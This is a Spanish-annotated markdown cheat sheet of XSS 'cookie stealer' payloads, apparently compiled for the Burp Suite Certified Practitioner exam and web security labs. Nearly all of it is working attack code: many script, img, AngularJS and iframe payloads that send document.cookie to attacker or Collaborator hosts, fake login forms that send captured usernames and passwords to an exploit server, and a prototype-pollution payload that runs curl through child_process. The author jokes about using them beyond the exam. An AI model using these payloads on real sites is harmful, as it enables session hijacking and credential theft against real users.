# CookieStealer XSS Payloads

Con fines correctos JAJAJAJAJA, bueno pa' el BSCP y lo que se atraviese si me cogen de malas pulgas si sabe.

> Inject XSS Stored Cookie Session

```js
//Todo codeado a url excepto el ' que está dentro de parentesis (sin parentesis claro) tiramos un scan selected insertion point y nos retorno el xss stored de la cookie, que fue la que seleccionamos y le hicimos el scan. 
(')"><svg/onload=fetch(`//BURP-COLLABORATOR\.oastify.com?c=${document.cookie}`)>

'%22%3E%3Csvg%2Fonload%3Dfetch%28%60%2F%2Frhc2glih6cztxui4wzfa76i1ws2jqnec%5C.oastify.com%3Fc%3D%24%7Bdocument.cookie%7D%60%29%3E
```

> Steal cookies collaborator:

```html
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

> Steal Cookies Exploit Server:

```html
<script>
fetch(`https://collaborator.net/x`+document.cookie);
</script>
```

> XSS Cookie Stealer payloads using JavaScript

```js
JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
```

> Reflected XSS into HTML context with nothing encoded in search.

```js
<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>
```

> Reflected DOM XSS, into JSON data that is processed by **eval().**

```js
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
```

> JavaScript Template literals are enclosed by backtick (` esta comilla`` ) characters instead of double or single quotes.

```js
${document.location='https://BURP-COLLAB.com/?cookies='+document.cookie;}
```

[![JavaScript template string](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/javascript-template-string.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/javascript-template-string.png)

> AngularJS DOM XSS Attack **constructor** payloads

```js
{{$on.constructor('alert(1)')()}}

{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```

```
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```

> HTTP request smuggling to deliver reflected XSS

```js
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```

> Web Cache Parameter cloaking - script `/js/geolocate.js`, executing the callback function `setCountryCookie()`

```js
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```

> More Cross-Site Scripting (XSS) example cookie stealer payloads.

```js
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```

<hr>

> HTML Tag, with invalid Image source, with escape sequence from source code calling `window.location` for the **LastViewedProduct``` cookie.

```js
//EN LA SECCION DE COMENTAR ->  XSS STORED DOM
<img src=x onerror=this.src'https://COLLAB.com/?'+document.cookie;>

&'><img src=1 onerror=print()>

&'><img src=x onerror=this.src="https://EXPLOIT-SERVER/?ex="+document.cookie>

<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
```

>_**Document.location**_ returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```js
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;

document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

> Document.write

```js
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
```

```js
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>
```

```js 
<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

```js 
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  }); 
</script>   
```

```
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
```

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```

> OSCP Offsec PWK hand book cookie stealer example

```js 
<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
```

> Alt Cookie Stealer

```js
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>

<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>

<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

> :::: Steal Password / Cookie Stealer ::::

> XMLHttpRequest

```js
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

> FETCH API

```js
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

> :::: DATA EXFILTRATION / COOKIE STEALER ::::

```js
</textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 

<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>

<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>

<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>


```

> IFRAMEs

```js
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

> Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

```
document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
```

> Prompt Validation payload, does not steal cookie or send it to exploit server.

```html
<img src=x onerror=prompt(1)>
```

> Remote code execution via server-side prototype pollution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

Eso sería todo -.- 